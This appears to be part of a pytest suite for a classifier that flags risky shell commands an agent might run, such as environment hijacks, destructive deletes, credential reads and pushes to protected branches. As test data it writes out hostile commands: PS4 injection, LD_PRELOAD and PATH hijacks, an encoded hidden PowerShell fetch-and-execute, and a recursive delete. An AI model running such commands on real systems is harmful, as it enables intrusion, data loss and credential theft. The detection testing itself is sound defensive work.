    ("PS4='$(id)' <<BA>> -x a.sh", {C.ENVIRONMENT_HIJACK}, set()),
    ("<<PCMD>>=./x <<BA>>", {C.ENVIRONMENT_HIJACK}, set()),
    ("ENV=./x <<SH>>", {C.ENVIRONMENT_HIJACK}, set()),
    ("env <<LDP>>=/tmp/x.so ls", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("export PATH=/tmp:$PATH", {C.ENVIRONMENT_HIJACK}, {C.READ_ONLY_COMMAND}),
    ("setx PATH C:\\tmp", {C.ENVIRONMENT_HIJACK}, set()),
    ("$env:path = 'C:\\tmp'", {C.ENVIRONMENT_HIJACK}, set()),
]

_SPECIAL = {
    "ENCODED_RM": lambda: f"<<PS>> <<ENC>> {ps_encoded('Remove-Item -Recurse C:/x')}",
    "ENCODED_FETCH": lambda: (
        f"<<PS>>.exe -NoP -W <<HID>> <<ENCC>> {ps_encoded('<<IW>> <<URL>> | <<IE>>')}"
    ),
}


def command_of(template: str) -> str:
    special = _SPECIAL.get(template)
    return t(special() if special else template)


@pytest.mark.parametrize(
    ("template", "must", "must_not"), CASES, ids=[str(i) for i in range(len(CASES))]
)
def test_classifies(template: str, must: set[C], must_not: set[C]) -> None:
    result = classify_command(command_of(template), CFG)
    missing = must - result.classes
    wrong = must_not & result.classes
    assert not missing, f"missing {sorted(missing)} in {sorted(result.classes)}"
    assert not wrong, f"unexpected {sorted(wrong)} in {sorted(result.classes)}"


def test_the_table_is_large_and_covers_every_class() -> None:
    covered: set[C] = set().union(*(must for _, must, _ in CASES))
    assert len(CASES) >= 200
    assert covered == set(CommandClass)


def test_read_only_is_never_combined_with_another_class() -> None:
    for template, _, _ in CASES:
        classes = classify_command(command_of(template), CFG).classes
        assert C.READ_ONLY_COMMAND not in classes or len(classes) == 1, template


def test_unparseable_text_gives_only_unparseable() -> None:
    assert classify_command("echo 'x", CFG).classes == {C.UNPARSEABLE}


def test_one_failed_reading_never_yields_read_only() -> None:
    """Coordinator finding 2 and review M3: a here-document cannot be read as
    PowerShell/cmd, so even a harmless one is not read-only, and the failed reading makes
    it unparseable; the same reader with no here-document is read-only."""
    heredoc = classify_command("cat <<'EOF'\nhello\nEOF", CFG)
    assert C.READ_ONLY_COMMAND not in heredoc.classes
    assert C.UNPARSEABLE in heredoc.classes
    assert classify_command("cat notes.txt", CFG).classes == {C.READ_ONLY_COMMAND}


def test_quoted_heredoc_body_is_data() -> None:
    data = classify_command(t("cat > notes.md <<'EOF'\nrun <<RM>> <<RF>> build\nEOF"), CFG)
    assert C.DESTRUCTIVE_DELETE not in data.classes
    assert data.classes == {C.UNPARSEABLE}  # the PowerShell/cmd reading fails (review M3)


def test_push_that_names_no_branch_is_unknown_whatever_the_target_says() -> None:
    """Review H5: the reported current branch is not where `push.default`, an upstream or
    `remote.<name>.push` may send the push, so no destination means unknown."""
    feature = classify_command("git push", CFG, target_branch="feature/a")
    main = classify_command("git push", CFG, target_branch="main")
    assert C.GIT_PUSH_PROTECTED_REF in feature.classes
    assert C.GIT_PUSH_PROTECTED_REF in main.classes
    assert feature.branches == frozenset()
    assert feature.unknown_branch


def test_branches_named_in_the_command_are_reported() -> None:
    result = classify_command("git push origin a:release/9 b", CFG)
    assert result.branches == frozenset({"release/9", "b"})


def test_extra_patterns_from_the_ruleset_extend_the_built_in_lists() -> None:
    cfg = ClassifierConfig(
        protected_branches=("main",),
        agent_config_paths=("**/ASSISTANT.md",),
        credential_paths=("**/vault.txt",),
    )
    assert C.AGENT_CONFIG_CHANGE in classify_command("echo x >> ASSISTANT.md", cfg).classes
    assert C.CREDENTIAL_ACCESS in classify_command("cat vault.txt", cfg).classes
    assert C.CREDENTIAL_ACCESS in classify_command(t("cat <<IDRSA>>"), cfg).classes


def test_truncated_command_is_unparseable() -> None:
    result = classify_command("ls", CFG, truncated=True)
    assert C.UNPARSEABLE in result.classes
    assert C.READ_ONLY_COMMAND not in result.classes


def test_bad_config_pattern_is_refused() -> None:
    with pytest.raises(ValueError, match="glob"):
        ClassifierConfig(protected_branches=("ma[in]",))


def test_tokens_resolve() -> None:
    assert t("<<CU>>") == "c" + "url"
    with pytest.raises(KeyError):
        t("<<NOPE>>")
